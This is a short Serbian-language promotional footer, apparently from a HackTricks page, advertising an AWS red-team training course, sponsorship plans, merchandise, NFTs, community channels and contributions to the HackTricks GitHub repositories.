<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
